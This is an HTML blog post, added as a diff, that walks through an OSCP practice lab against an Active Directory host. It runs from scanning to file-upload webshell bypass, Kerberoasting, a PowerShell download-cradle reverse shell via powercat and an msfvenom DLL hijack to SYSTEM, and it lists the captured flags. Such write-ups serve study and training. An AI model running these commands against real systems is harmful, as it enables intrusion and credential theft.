@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>OSCP - Access - AD :: Digital Garden</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Improved skills PHP bypasses Windows PrivEsc SeManageVolume Privilege Abuse Used tools nmap python powershell Information Gathering Scanned all TCP ports:
+sudo nmap -p- -vvv -oN access.nmap 192.168.230.187 Enumerated open TCP ports:
+PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 125 80/tcp open http syn-ack ttl 125 88/tcp open kerberos-sec syn-ack ttl 125 135/tcp open msrpc syn-ack ttl 125 139/tcp open netbios-ssn syn-ack ttl 125 389/tcp open ldap syn-ack ttl 125 445/tcp open microsoft-ds syn-ack ttl 125 464/tcp open kpasswd5 syn-ack ttl 125 593/tcp open http-rpc-epmap syn-ack ttl 125 636/tcp open ldapssl syn-ack ttl 125 3268/tcp open globalcatLDAP syn-ack ttl 125 3269/tcp open globalcatLDAPssl syn-ack ttl 125 5985/tcp open wsman syn-ack ttl 125 9389/tcp open adws syn-ack ttl 125 49666/tcp open unknown syn-ack ttl 125 49668/tcp open unknown syn-ack ttl 125 49673/tcp open unknown syn-ack ttl 125 49674/tcp open unknown syn-ack ttl 125 49677/tcp open unknown syn-ack ttl 125 49704/tcp open unknown syn-ack ttl 125 49791/tcp open unknown syn-ack ttl 125 Enumeration Port 53 - DNS No enumeration conducted
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/oscp---access---ad/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="/favicon.png">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="OSCP - Access - AD">
+<meta property="og:description" content="Improved skills PHP bypasses Windows PrivEsc SeManageVolume Privilege Abuse Used tools nmap python powershell Information Gathering Scanned all TCP ports:
+sudo nmap -p- -vvv -oN access.nmap 192.168.230.187 Enumerated open TCP ports:
+PORT STATE SERVICE REASON 53/tcp open domain syn-ack ttl 125 80/tcp open http syn-ack ttl 125 88/tcp open kerberos-sec syn-ack ttl 125 135/tcp open msrpc syn-ack ttl 125 139/tcp open netbios-ssn syn-ack ttl 125 389/tcp open ldap syn-ack ttl 125 445/tcp open microsoft-ds syn-ack ttl 125 464/tcp open kpasswd5 syn-ack ttl 125 593/tcp open http-rpc-epmap syn-ack ttl 125 636/tcp open ldapssl syn-ack ttl 125 3268/tcp open globalcatLDAP syn-ack ttl 125 3269/tcp open globalcatLDAPssl syn-ack ttl 125 5985/tcp open wsman syn-ack ttl 125 9389/tcp open adws syn-ack ttl 125 49666/tcp open unknown syn-ack ttl 125 49668/tcp open unknown syn-ack ttl 125 49673/tcp open unknown syn-ack ttl 125 49674/tcp open unknown syn-ack ttl 125 49677/tcp open unknown syn-ack ttl 125 49704/tcp open unknown syn-ack ttl 125 49791/tcp open unknown syn-ack ttl 125 Enumeration Port 53 - DNS No enumeration conducted
+" />
+<meta property="og:url" content="/posts/oscp---access---ad/" />
+<meta property="og:site_name" content="Digital Garden" />
+
+  <meta property="og:image" content="/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Digital Garden
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/oscp---access---ad/">OSCP - Access - AD</a>
+  </h1>
+  <div class="post-meta"></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="improved-skills">Improved skills<a href="#improved-skills" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>PHP bypasses</li>
+<li>Windows PrivEsc</li>
+<li>SeManageVolume Privilege Abuse</li>
+</ul>
+<h2 id="used-tools">Used tools<a href="#used-tools" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>nmap</li>
+<li>python</li>
+<li>powershell</li>
+</ul>
+<hr>
+<h1 id="information-gathering">Information Gathering<a href="#information-gathering" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p>Scanned all TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -p- -vvv -oN access.nmap 192.168.230.187
+</span></span></code></pre></div><p>Enumerated open TCP ports:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PORT      STATE SERVICE          REASON
+</span></span><span class="line"><span class="cl">53/tcp    open  domain           syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">80/tcp    open  http             syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec     syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc            syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn      syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">389/tcp   open  ldap             syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds     syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">464/tcp   open  kpasswd5         syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">593/tcp   open  http-rpc-epmap   syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">636/tcp   open  ldapssl          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">3268/tcp  open  globalcatLDAP    syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">3269/tcp  open  globalcatLDAPssl syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">5985/tcp  open  wsman            syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">9389/tcp  open  adws             syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49666/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49668/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49673/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49674/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49677/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49704/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span><span class="line"><span class="cl">49791/tcp open  unknown          syn-ack ttl <span class="m">125</span>
+</span></span></code></pre></div><hr>
+<h1 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="port-53---dns">Port 53 - DNS<a href="#port-53---dns" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-80---http-h2-database">Port 80 - HTTP (H2 Database)<a href="#port-80---http-h2-database" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Navigated to <code>http://192.168.196.187:80</code>, viewed source and identified <code>TheEvent v4.6.0</code> (No exploits found)
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image1.png" alt="OSCP Access AD Image1">
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image2.png" alt="OSCP Access AD Image2"></li>
+<li>Opened Wappalyzer and identified <code>PHP 8.0.7</code>, <code>Windows Server</code> and <code>Apache HTTP Server 2.4.48</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image3.png" alt="OSCP Access AD Image3"></li>
+<li>Identified Contact form and attempted to send test message - received &ldquo;Error: Unable to load the &ldquo;PHP Email Form&rdquo; Library!&rdquo;
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image4.png" alt="OSCP Access AD Image4"></li>
+<li>Ran <code>gobuster dir -u http://192.168.196.187 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code> - identified <code>/assets</code>, <code>/forms</code>, <code>/uploads</code>.
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image5.png" alt="OSCP Access AD Image5"></li>
+<li>Returned to browser and identified file upload facility through &ldquo;Buy Tickets&rdquo; - created &amp; uploaded <code>uploadtest.txt</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image6.png" alt="OSCP Access AD Image6"></li>
+<li>Navigated to <code>192.168.196.187/uploads/uploadtest.txt</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image7.png" alt="OSCP Access AD Image7"></li>
+</ul>
+<h2 id="port-88---kerberos">Port 88 - Kerberos<a href="#port-88---kerberos" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt</code> and identified username <code>administrator@access.offsec</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image8.png" alt="OSCP Access AD Image8"></li>
+<li>Ran <code>./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Names/names.txt -v</code> - no results
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image9.png" alt="OSCP Access AD Image9"></li>
+<li>Ran <code>./kerbrute-linux64 userenum -d access.offsec --dc 192.168.196.187 /usr/share/wordlists/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -v</code> - identified users <code>administrator</code> and <code>server</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image10.png" alt="OSCP Access AD Image10">
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image11.png" alt="OSCP Access AD Image11"></li>
+</ul>
+<h2 id="port-135---msrpc-windows-rpc">Port 135 - MSRPC (Windows RPC)<a href="#port-135---msrpc-windows-rpc" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>No enumeration conducted</p>
+<h2 id="port-139--445---smb">Port 139 &amp; 445 - SMB<a href="#port-139--445---smb" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>sudo nmap --script smb-vuln* -p 139,445 192.168.196.187</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image12.png" alt="OSCP Access AD Image12"></li>
+</ul>
+<h2 id="port-3896363268---ldap">Port 389/636/3268 - LDAP<a href="#port-3896363268---ldap" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.196.187</code> - identified domain <code>access.offsec</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image13.png" alt="OSCP Access AD Image13"></li>
+</ul>
+<hr>
+<h1 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="arbitary-file-upload">Arbitary File Upload<a href="#arbitary-file-upload" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>Ran <code>echo &quot;AddType application/x-httpd-php .bypass&quot; &gt; .htaccess</code> to allow new filename <code>.bypass</code> and uploaded <code>.htaccess</code> to target
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image14.png" alt="OSCP Access AD Image14"></p>
+<ul>
+<li>Renamed <code>simple-backdoor.php</code> to <code>simple-backdoor.bypass</code> and uploaded
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image15.png" alt="OSCP Access AD Image15"></li>
+<li>Navigated to <code>http://192.168.196.187/uploads/simple-backdoor.bypass?cmd=whoami</code> and achieved code execution on target
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image16.png" alt="OSCP Access AD Image16"></li>
+<li>Generated PHP reverse shell to connect back to Attacker IP
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image17.png" alt="OSCP Access AD Image17"></li>
+<li>Saved PHP reverse shell as <code>php-reverse.bypass</code>, then uploaded to target.
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image18.png" alt="OSCP Access AD Image18"></li>
+<li>Started netcat listener on port <code>1234</code> then navigated to <code>http://192.168.196.187/uploads/php-reverse.bypass</code> and caught reverse shell
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image19.png" alt="OSCP Access AD Image19"></li>
+</ul>
+<hr>
+<h1 id="lateral-movement-to-user">Lateral Movement to user<a href="#lateral-movement-to-user" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration">Local Enumeration<a href="#local-enumeration" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>whoami /priv</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image20.png" alt="OSCP Access AD Image20"></li>
+<li>Ran <code>systeminfo</code> - identified <code>Windows Server 2019</code> <code>Build 17763</code> on <code>x64</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image21.png" alt="OSCP Access AD Image21"></li>
+<li>Uploaded <code>winpeasx64.exe</code> and ran on target
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image22.png" alt="OSCP Access AD Image22"></li>
+<li>Identified vulnerabilities with <code>Watson</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image23.png" alt="OSCP Access AD Image23"></li>
+<li>Identified unquoted autorun binaries with spaces
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image24.png" alt="OSCP Access AD Image24">
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image25.png" alt="OSCP Access AD Image25"></li>
+<li>Uploaded <code>Get-SPN.ps1</code> and ran on target - identified
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image26.png" alt="OSCP Access AD Image26"></li>
+<li>Ran <code>Add-Type -AssemblyName System.IdentityModel</code> and <code>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image27.png" alt="OSCP Access AD Image27"></li>
+</ul>
+<h2 id="lateral-movement-vector">Lateral Movement vector<a href="#lateral-movement-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Served <code>Invoke-Kerberoast.ps1</code> via Python3 server then ran: <code>iex(new-object net.webclient).downloadString('http://192.168.45.178:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat</code> for <code>svc_mssql</code> ticket hash
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image28.png" alt="OSCP Access AD Image28"></li>
+<li>Reformatted and saved hash to local host as <code>msql.hash</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image29.png" alt="OSCP Access AD Image29"></li>
+<li>Ran <code>john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 MSQL.hash</code> and cracked hash for credential <code>trustno1</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image30.png" alt="OSCP Access AD Image30"></li>
+<li>Uploaded <code>Invoke-RunasCs.ps1</code>, started netcat listener on port <code>5555</code> then ran <code>Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command &quot;Powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.178/powercat.ps1');powercat -c 192.168.45.178 -p 5555 -e cmd&quot;</code> for reverse shell as <code>svc_mssql</code> - caught reverse shell as <code>svc_mssql</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image31.png" alt="OSCP Access AD Image31"></li>
+<li>Ran <code>type C:\Users\svc_mssql\Desktop\local.txt</code> to print local flag <code>d075a9b799bbf34764ed55ccd797108d</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image32.png" alt="OSCP Access AD Image32"></li>
+</ul>
+<hr>
+<h1 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<h2 id="local-enumeration-1">Local Enumeration<a href="#local-enumeration-1" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Ran <code>whoami /priv</code> and identified <code>SeManageVolumePrivilege</code> - vulnerable to <a href="https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public">SeManageVolumeExploit</a>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image33.png" alt="OSCP Access AD Image33"></li>
+</ul>
+<h2 id="privilege-escalation-vector">Privilege Escalation vector<a href="#privilege-escalation-vector" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ul>
+<li>Served <code>SeManageVolumeExploit.exe</code> via python and ran <code>iwr -uri http://192.168.45.178/SeManageVolumeExploit.exe -outfile SeManageVolumeExploit.exe</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image34.png" alt="OSCP Access AD Image34"></li>
+<li>Ran <code>icacls C:\Windows\System32</code> - identified full privileges to <code>C:Windows\System32</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image35.png" alt="OSCP Access AD Image35"></li>
+<li>Ran <code>msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.178 LPORT=6666 -f dll -o tzres.dll</code> to create reverse shell in <code>tzres.dll</code> and uploaded to <code>C:\Windows\System32\wbem</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image36.png" alt="OSCP Access AD Image36"></li>
+<li>Started netcat listener on port <code>6666</code> and ran <code>systeminfo</code> on target to trigger reverse shell - caught reverse shell as <code>nt authority</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image37.png" alt="OSCP Access AD Image37">
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image38.png" alt="OSCP Access AD Image38"></li>
+<li>Ran <code>type C:\Users\Administrator\Desktop\proof.txt</code> to print proof flag <code>46e76431490ebf8ccc7c112f112fcfc2</code>
+<img src="/images/OSCP%20-%20Access%20-%20AD%20-%20image39.png" alt="OSCP Access AD Image39"></li>
+</ul>
+<hr>
+<h1 id="trophy--loot">Trophy &amp; Loot<a href="#trophy--loot" class="hanchor" ariaLabel="Anchor">#</a> </h1>
+<p><code>local.txt</code> = <code>d075a9b799bbf34764ed55ccd797108d</code>
+<code>proof.txt</code> = <code>46e76431490ebf8ccc7c112f112fcfc2</code></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="/posts/oscp/" class="button inline prev">
+        &lt; [<span class="button__text">OSCP</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="/posts/oscp---active-directory/" class="button inline next">
+         [<span class="button__text">OSCP - AD - 6</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
